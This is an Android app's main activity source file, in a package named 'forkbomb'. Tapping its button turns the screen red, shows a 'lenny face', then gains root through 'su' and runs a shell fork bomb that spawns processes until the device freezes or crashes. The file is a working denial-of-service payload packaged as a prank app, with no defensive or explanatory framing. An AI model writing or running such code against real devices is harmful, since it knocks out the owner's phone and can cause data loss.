package dfinetec.lorem.com.forkbomb;

import android.graphics.Color;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.DataOutputStream;
import java.io.IOException;


public class MainActivity extends AppCompatActivity {
    private int counter = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final String[] commands = {
                "forkbomb(){ forkbomb | forkbomb & };",
                "forkbomb"};
        final Button imageButton = (Button) findViewById(R.id.button);
        if (imageButton != null && counter == 0) {
            imageButton.setOnClickListener(new View.OnClickListener() {
                /**
                 * Called when a view has been clicked.
                 *
                 * @param v The view that was clicked.
                 */
                @Override
                public void onClick(View v) {
                    findViewById(R.id.background).setBackgroundColor(Color.RED);
                    ((TextView) findViewById(R.id.textView)).setText(null);
                    findViewById(R.id.textView).setBackgroundColor(Color.TRANSPARENT);
                    imageButton.setText(R.string.lenny_face);
                    imageButton.setBackgroundColor(Color.RED);
                    imageButton.setTextColor(Color.WHITE);
                    imageButton.setTextSize(imageButton.getTextSize() * 2);
                    counter = 1;
                    execCommands(commands);


                }
            });
        }
    }


    public Boolean execCommands(String... command) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process process = rt.exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());


            for (String aCommand : command) {
                os.writeBytes(aCommand + "\n");
                os.flush();
            }
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            return false;
        } catch (InterruptedException e) {
            return false;
        }
        return true;
    }
}
